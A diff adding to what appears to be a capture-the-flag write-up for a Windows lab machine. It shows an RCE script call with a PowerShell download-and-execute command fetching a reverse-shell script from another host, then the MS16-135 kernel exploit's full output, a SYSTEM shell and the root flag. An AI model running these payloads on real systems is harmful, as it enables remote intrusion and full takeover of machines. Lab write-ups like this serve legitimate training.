@@ -176,4 +176,93 @@ The shell sometimes will be broken...
 
 python3 rce2.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7:8000/mini-reverse.ps1')"
 
+Sherlock.ps1 + MS16-032 + MS16-135 + Try Harder!
+
+C:\Users\Public>c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe .\MS16-135.ps1;cmd.exe
+c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe .\MS16-135.ps1;cmd.exe
+         _____ _____ ___   ___     ___   ___ ___
+        |     |   __|_  | |  _|___|_  | |_  |  _|
+        | | | |__   |_| |_| . |___|_| |_|_  |_  |
+        |_|_|_|_____|_____|___|   |_____|___|___|
+
+                           [by b33f -> @FuzzySec]
+
+[?] Target is Win 8.1
+[+] Bitmap dimensions: 0x760*0x4
+
+[?] Adjacent large session pool feng shui..
+[+] Worker  : FFFFF90142247000
+[+] Manager : FFFFF90142249000
+[+] Distance: 0x2000
+
+[?] Creating Window objects
+[+] Corrupting child window spmenu
+[+] Trying to trigger arbitrary 'Or'..
+[+] Trying to trigger arbitrary 'Or'..
+
+[?] Success, reading beyond worker bitmap size!
+[+] Old manager bitmap pvScan0: FFFFF90142249260
+[+] New manager bitmap pvScan0: FFFFF90142247050
+
+[>] Leaking SYSTEM _EPROCESS..
+[+] _EPROCESS list entry: 0xFFFFF80332B6E028
+[+] SYSTEM _EPROCESS address: 0xFFFFE001AA83B7C0
+[+] PID: 4
+[+] SYSTEM Token: 0xFFFFC0013D8079BF
+
+[>] Leaking current _EPROCESS..
+[+] Traversing ActiveProcessLinks list
+[+] PowerShell _EPROCESS address: 0xFFFFE001AE068900
+[+] PID: 2936
+[+] PowerShell Token: 0xFFFFC0014053E9F1
+
+[!] Duplicating SYSTEM token!
+
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\Public>whoami
+whoami
+nt authority\system
+
+C:\Users\Public>cd ..
+cd ..
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users
+
+18/03/2017  02:57 ▒▒    <DIR>          .
+18/03/2017  02:57 ▒▒    <DIR>          ..
+18/03/2017  02:52 ▒▒    <DIR>          Administrator
+31/05/2022  11:48 ▒▒    <DIR>          kostas
+31/05/2022  11:48 ▒▒    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  31.897.382.912 bytes free
+
+C:\Users>cd administrator
+cd administrator
+
+C:\Users\Administrator>cd desktop
+cd desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of C:\Users\Administrator\Desktop
+
+18/03/2017  03:14 ▒▒    <DIR>          .
+18/03/2017  03:14 ▒▒    <DIR>          ..
+18/03/2017  03:14 ▒▒                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  31.897.382.912 bytes free
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+51ed1b36553c8461f4552c2e92b3eeed
 
